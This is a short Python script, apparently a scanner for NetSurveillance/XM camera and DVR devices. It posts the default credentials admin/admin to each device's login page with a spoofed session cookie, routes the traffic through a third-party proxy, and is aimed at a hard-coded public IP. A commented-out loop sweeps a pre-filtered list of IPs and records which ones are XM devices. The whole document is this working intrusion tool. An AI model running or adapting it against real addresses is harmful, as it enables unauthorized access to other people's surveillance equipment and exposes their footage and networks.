import requests
from bs4 import BeautifulSoup

def islogin(ip):
    payload = {'command':"login",'username':"admin",'password':"admin"}
    url = "http://"+ip+"/Login.htm"
    headers = {
        'Host': ip,
        'Connection': 'keep-alive',
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        'Accept-Language':"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        'Accept-Encoding':"gzip, deflate",
        'Upgrade-Insecure-Requests':'1',
        'Referer': "http://"+ip,
        'Content-Length': '43',
        'Content - Type': 'application / x - www - form - urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Cookie': "NetSuveillanceWebCookie=%7B%22username%22%3A%22admin%22%7D"}
    proxy = {'http': 'http://121.193.143.249:80'}
    res = requests.Session().post(url,payload,headers=headers,timeout=3,proxies=proxy)
    return res
# usable_ips 筛选一遍后的ip
resultIps = []
if __name__ == "__main__":
    print(islogin('221.206.195.2').text)
    # count = 0
    # for ip in usable_ips:
    #     count += 1
    #     try:
    #         res = islogin(ip)
    #         soup = BeautifulSoup(res.text,'lxml')
    #         print(soup.title.text)
    #         if soup.title.text == "NetSurveillance":
    #             resultIps.append(ip)
    #             print(ip," is XM")
    #
    #     except:
    #         print(count,"---")
    #         pass
    # print(resultIps)
